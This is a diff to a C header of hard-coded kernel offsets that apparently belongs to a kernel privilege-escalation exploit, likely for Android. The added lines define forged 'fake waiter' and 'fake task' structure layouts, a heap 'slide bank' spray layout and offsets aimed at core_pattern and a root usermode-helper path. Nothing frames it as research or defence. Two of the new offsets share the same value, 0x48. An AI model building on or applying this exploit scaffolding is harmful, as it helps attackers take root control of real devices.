@@ -77,7 +77,7 @@
 #define OFFSET_do_faccessat 0x550278
 #define OFFSET_core_pattern 0xac56140
 
-// ========== ASHMEM FUNCTIONS (Not in kernel - set to 0) ==========
+// ========== ASHMEM FUNCTIONS (NOT IN KERNEL) ==========
 #define ASHMEM_IOCTL            0x00000000
 #define ASHMEM_COMPAT_IOCTL     0x00000000
 #define ASHMEM_MMAP             0x00000000
@@ -138,8 +138,6 @@
 #define POOL_NR_IDLE_OFF        0x08
 
 // ========== SLAB/STRUCT OFFSETS ==========
-// Note: KMALLOC_BUCKETS and KMALLOC_PIPE_INDEX are defined in common.h
-// Do not redefine them here to avoid warnings
 #define KMALLOC_CGROUP_TYPE     0
 #define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
 #define STRUCT_SLAB_CACHE_OFF   0x10
@@ -155,6 +153,27 @@
 #define FAKE_WAITER_LOCK_OFF          0x38
 #define FAKE_WAITER_WAKE_STATE_OFF    0x40
 #define FAKE_WAITER_WW_CTX_OFF        0x48
+#define FAKE_WAITER_PRIO_OFF          0x44
+#define FAKE_WAITER_DEADLINE_OFF      0x48
+
+// ========== FAKE TASK OFFSETS ==========
+#define FAKE_TASK_USAGE_OFF         0x38
+#define FAKE_TASK_PRIO_OFF          0x7c
+#define FAKE_TASK_NORMAL_PRIO_OFF   0x84
+#define FAKE_TASK_TASK_GROUP_OFF    0x400
+#define FAKE_TASK_PI_LOCK_OFF       0x884
+#define FAKE_TASK_PI_WAITERS_OFF    0x898
+#define FAKE_TASK_PI_TOP_TASK_OFF   0x8a8
+#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b0
+#define FAKE_TASK_PRIO               130
+
+// ========== SLIDE BANK OFFSETS ==========
+#define SLIDE_BANK_SLOTS           4
+#define SLIDE_BANK_TASK_OFF        0x1000
+#define SLIDE_BANK_TASK_STRIDE     0x1c0
+#define SLIDE_BANK_LOCK_OFF        0x5200
+#define SLIDE_BANK_SLOT_STRIDE     0x100
+#define SLIDE_BANK_WAITER_OFF      0x40
 
 // ========== ROOT UMH OFFSETS ==========
 #define ROOT_UMH_WORK_OFF       0x00
